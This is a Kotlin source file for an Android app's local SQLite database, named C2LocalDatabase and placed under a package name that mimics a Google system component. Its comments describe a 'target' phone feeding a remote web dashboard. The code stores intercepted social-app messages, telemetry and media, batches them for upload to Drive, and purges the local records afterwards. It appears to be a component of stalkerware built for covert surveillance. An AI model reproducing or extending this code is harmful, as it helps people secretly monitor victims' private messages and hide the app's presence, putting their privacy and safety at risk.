package com.google.android.system

import android.content.ContentValues
import android.content.Context
import android.database.sqlite.SQLiteDatabase
import android.database.sqlite.SQLiteOpenHelper
import android.util.Log
import com.homemonitor.ArchiveScheduler
import org.json.JSONArray
import org.json.JSONObject

/**
 * C2LocalDatabase
 * Embedded SQLite Database running locally on the target Android phone.
 * Serves as the primary local database and server data store for the Web Dashboard over WebRTC DataChannel.
 * Supports one-way historical sequence watermarking, local archive cursors, and atomic purge transactions.
 */
class C2LocalDatabase(private val context: Context) : SQLiteOpenHelper(context, DATABASE_NAME, null, DATABASE_VERSION) {

    companion object {
        private const val TAG = "C2LocalDatabase"
        private const val DATABASE_NAME = "c2_local_database.db"
        private const val DATABASE_VERSION = 2

        const val TABLE_SOCIAL_MESSAGES = "social_messages"
        const val TABLE_TELEMETRY_LOGS = "telemetry_logs"
        const val TABLE_MEDIA_RECORDS = "media_records"
        const val TABLE_ARCHIVE_BATCHES = "archive_batches"
        const val TABLE_ARCHIVE_CURSORS = "archive_cursors"

        val HISTORICAL_TABLES = listOf(TABLE_SOCIAL_MESSAGES, TABLE_TELEMETRY_LOGS, TABLE_MEDIA_RECORDS)

        @Volatile
        private var instance: C2LocalDatabase? = null

        fun getInstance(context: Context): C2LocalDatabase {
            return instance ?: synchronized(this) {
                instance ?: C2LocalDatabase(context.applicationContext).also { instance = it }
            }
        }
    }

    override fun onCreate(db: SQLiteDatabase) {
        try {
            db.execSQL(
                """
                CREATE TABLE $TABLE_SOCIAL_MESSAGES (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    app_name TEXT,
                    app_key TEXT,
                    sender TEXT,
                    text_content TEXT,
                    direction TEXT,
                    time_str TEXT,
                    timestamp LONG
                );
                """.trimIndent()
            )

            db.execSQL(
                """
                CREATE TABLE $TABLE_TELEMETRY_LOGS (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    category TEXT,
                    content TEXT,
                    timestamp LONG
                );
                """.trimIndent()
            )

            db.execSQL(
                """
                CREATE TABLE $TABLE_MEDIA_RECORDS (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    media_type TEXT,
                    media_url TEXT,
                    local_path TEXT,
                    timestamp LONG
                );
                """.trimIndent()
            )

            createArchiveMetadataTables(db)

            Log.i(TAG, "Created embedded SQLite C2LocalDatabase tables successfully.")
        } catch (e: Exception) {
            Log.e(TAG, "onCreate error: ${e.message}")
        }
    }

    private fun createArchiveMetadataTables(db: SQLiteDatabase) {
        db.execSQL(
            """
            CREATE TABLE IF NOT EXISTS $TABLE_ARCHIVE_BATCHES (
                batch_id TEXT PRIMARY KEY,
                dataset TEXT NOT NULL,
                from_sequence INTEGER NOT NULL,
                to_sequence INTEGER NOT NULL,
                record_count INTEGER NOT NULL,
                checksum TEXT,
                drive_file_id TEXT,
                state TEXT NOT NULL,
                created_at INTEGER NOT NULL,
                committed_at INTEGER
            );
            """.trimIndent()
        )

        db.execSQL(
            """
            CREATE TABLE IF NOT EXISTS $TABLE_ARCHIVE_CURSORS (
                dataset TEXT PRIMARY KEY,
                last_archived_sequence INTEGER NOT NULL,
                last_batch_id TEXT,
                updated_at INTEGER NOT NULL
            );
            """.trimIndent()
        )
    }

    override fun onUpgrade(db: SQLiteDatabase, oldVersion: Int, newVersion: Int) {
        if (oldVersion < 2) {
            createArchiveMetadataTables(db)
            Log.i(TAG, "Upgraded C2LocalDatabase schema to version 2 (Archive metadata tables added).")
        }
    }

    fun insertSocialMessage(appName: String, sender: String, text: String, isOutgoing: Boolean) {
        if (text.isBlank()) return
        try {
            val db = writableDatabase
            val appKey = appName.lowercase().replace(Regex("[^a-z0-9]"), "")
            val timeStr = java.text.SimpleDateFormat("hh:mm a", java.util.Locale.getDefault()).format(java.util.Date())

            val values = ContentValues().apply {
                put("app_name", appName)
                put("app_key", appKey)
                put("sender", if (sender.isNotBlank()) sender else if (isOutgoing) "Me" else "Contact")
                put("text_content", text)
                put("direction", if (isOutgoing) "outgoing" else "incoming")
                put("time_str", timeStr)
                put("timestamp", System.currentTimeMillis())
            }

            db.insert(TABLE_SOCIAL_MESSAGES, null, values)
            ArchiveScheduler.checkAndTriggerThreshold(context)
        } catch (e: Exception) {
            Log.e(TAG, "insertSocialMessage error: ${e.message}")
        }
    }

    fun insertTelemetryLog(category: String, content: String) {
        if (content.isBlank()) return
        try {
            val db = writableDatabase
            val catKey = category.lowercase().replace(Regex("[^a-z0-9_]"), "")

            val values = ContentValues().apply {
                put("category", catKey)
                put("content", content)
                put("timestamp", System.currentTimeMillis())
            }

            db.insert(TABLE_TELEMETRY_LOGS, null, values)
            ArchiveScheduler.checkAndTriggerThreshold(context)
        } catch (e: Exception) {
            Log.e(TAG, "insertTelemetryLog error: ${e.message}")
        }
    }

    fun insertMediaRecord(mediaType: String, mediaUrl: String, localPath: String) {
        try {
            val db = writableDatabase
            val values = ContentValues().apply {
                put("media_type", mediaType)
                put("media_url", mediaUrl)
                put("local_path", localPath)
                put("timestamp", System.currentTimeMillis())
            }
            db.insert(TABLE_MEDIA_RECORDS, null, values)
            ArchiveScheduler.checkAndTriggerThreshold(context)
        } catch (e: Exception) {
            Log.e(TAG, "insertMediaRecord error: ${e.message}")
        }
    }

    fun getSocialMessagesJson(appKey: String): JSONArray {
        val jsonArray = JSONArray()
        try {
            val db = readableDatabase
            val key = appKey.lowercase().replace(Regex("[^a-z0-9]"), "")
            val cursor = db.rawQuery(
                "SELECT sender, text_content, direction, time_str, timestamp FROM $TABLE_SOCIAL_MESSAGES WHERE app_key = ? ORDER BY id ASC LIMIT 50",
                arrayOf(key)
            )

            cursor.use {
                while (it.moveToNext()) {
                    val obj = JSONObject().apply {
                        put("sender", it.getString(0))
                        put("text", it.getString(1))
                        put("direction", it.getString(2))
                        put("time", it.getString(3))
                        put("timestamp", it.getLong(4))
                    }
                    jsonArray.put(obj)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "getSocialMessagesJson error: ${e.message}")
        }
        return jsonArray
    }

    fun getTelemetryLogsJson(category: String): JSONArray {
        val jsonArray = JSONArray()
        try {
            val db = readableDatabase
            val catKey = category.lowercase().replace(Regex("[^a-z0-9_]"), "")
            val cursor = db.rawQuery(
                "SELECT content, timestamp FROM $TABLE_TELEMETRY_LOGS WHERE category = ? ORDER BY id ASC LIMIT 50",
                arrayOf(catKey)
            )

            cursor.use {
                while (it.moveToNext()) {
                    val obj = JSONObject().apply {
                        put("content", it.getString(0))
                        put("timestamp", it.getLong(1))
                    }
                    jsonArray.put(obj)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "getTelemetryLogsJson error: ${e.message}")
        }
        return jsonArray
    }

    // ── Archive Sequence & Watermarking API ──

    fun getLastArchivedSequence(dataset: String): Long {
        var lastSeq = 0L
        try {
            val db = readableDatabase
            val cursor = db.rawQuery(
                "SELECT last_archived_sequence FROM $TABLE_ARCHIVE_CURSORS WHERE dataset = ?",
                arrayOf(dataset)
            )
            cursor.use {
                if (it.moveToFirst()) {
                    lastSeq = it.getLong(0)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "getLastArchivedSequence error for $dataset: ${e.message}")
        }
        return lastSeq
    }

    fun getMaxSequenceId(tableName: String): Long {
        var maxId = 0L
        try {
            val db = readableDatabase
            val cursor = db.rawQuery("SELECT MAX(id) FROM $tableName", null)
            cursor.use {
                if (it.moveToFirst() && !it.isNull(0)) {
                    maxId = it.getLong(0)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "getMaxSequenceId error for $tableName: ${e.message}")
        }
        return maxId
    }

    fun getUnarchivedRecords(tableName: String, fromSeq: Long, maxSeq: Long): List<JSONObject> {
        val records = mutableListOf<JSONObject>()
        if (fromSeq > maxSeq) return records

        try {
            val db = readableDatabase
            val cursor = db.rawQuery(
                "SELECT * FROM $tableName WHERE id >= ? AND id <= ? ORDER BY id ASC",
                arrayOf(fromSeq.toString(), maxSeq.toString())
            )

            cursor.use { c ->
                val colNames = c.columnNames
                while (c.moveToNext()) {
                    val obj = JSONObject()
                    for (i in colNames.indices) {
                        val name = colNames[i]
                        when (c.getType(i)) {
                            android.database.Cursor.FIELD_TYPE_INTEGER -> obj.put(name, c.getLong(i))
                            android.database.Cursor.FIELD_TYPE_FLOAT -> obj.put(name, c.getDouble(i))
                            android.database.Cursor.FIELD_TYPE_STRING -> obj.put(name, c.getString(i))
                            android.database.Cursor.FIELD_TYPE_BLOB -> obj.put(name, c.getBlob(i))
                            android.database.Cursor.FIELD_TYPE_NULL -> obj.put(name, JSONObject.NULL)
                        }
                    }
                    records.add(obj)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "getUnarchivedRecords error for $tableName: ${e.message}")
        }
        return records
    }

    fun getPendingRecordCount(): Int {
        var total = 0
        try {
            val db = readableDatabase
            for (table in HISTORICAL_TABLES) {
                val lastSeq = getLastArchivedSequence(table)
                val cursor = db.rawQuery("SELECT COUNT(*) FROM $table WHERE id > ?", arrayOf(lastSeq.toString()))
                cursor.use {
                    if (it.moveToFirst()) {
                        total += it.getInt(0)
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "getPendingRecordCount error: ${e.message}")
        }
        return total
    }

    fun getPendingRecordCountForDataset(dataset: String): Int {
        var count = 0
        try {
            val db = readableDatabase
            val lastSeq = getLastArchivedSequence(dataset)
            val cursor = db.rawQuery("SELECT COUNT(*) FROM $dataset WHERE id > ?", arrayOf(lastSeq.toString()))
            cursor.use {
                if (it.moveToFirst()) {
                    count = it.getInt(0)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "getPendingRecordCountForDataset error for $dataset: ${e.message}")
        }
        return count
    }

    /**
     * Executes atomic SQLite purge write transaction after verified remote archive commitment.
     * Deletes only records in range [fromSeq, toSeq], updates archive cursor, and logs batch ledger.
     */
    fun purgeArchivedRecordsAndCommitLedger(
        dataset: String,
        fromSeq: Long,
        toSeq: Long,
        batchId: String,
        driveFileId: String,
        recordCount: Int,
        checksum: String
    ): Boolean {
        val db = writableDatabase
        db.beginTransaction()
        return try {
            // 1. Delete committed sequence range
            val deletedRows = db.delete(dataset, "id >= ? AND id <= ?", arrayOf(fromSeq.toString(), toSeq.toString()))
            Log.i(TAG, "Purged $deletedRows committed historical records from $dataset (IDs $fromSeq..$toSeq).")

            // 2. Insert/Update archive cursor
            val cursorValues = ContentValues().apply {
                put("dataset", dataset)
                put("last_archived_sequence", toSeq)
                put("last_batch_id", batchId)
                put("updated_at", System.currentTimeMillis())
            }
            db.insertWithOnConflict(TABLE_ARCHIVE_CURSORS, null, cursorValues, SQLiteDatabase.CONFLICT_REPLACE)

            // 3. Log archive batch entry
            val batchValues = ContentValues().apply {
                put("batch_id", batchId)
                put("dataset", dataset)
                put("from_sequence", fromSeq)
                put("to_sequence", toSeq)
                put("record_count", recordCount)
                put("checksum", checksum)
                put("drive_file_id", driveFileId)
                put("state", "COMPLETED")
                put("created_at", System.currentTimeMillis())
                put("committed_at", System.currentTimeMillis())
            }
            db.insertWithOnConflict(TABLE_ARCHIVE_BATCHES, null, batchValues, SQLiteDatabase.CONFLICT_REPLACE)

            db.setTransactionSuccessful()
            Log.i(TAG, "Atomic purge and ledger commit successful for batch '$batchId'.")
            true
        } catch (e: Exception) {
            Log.e(TAG, "purgeArchivedRecordsAndCommitLedger error for batch '$batchId': ${e.message}", e)
            false
        } finally {
            db.endTransaction()
        }
    }
}
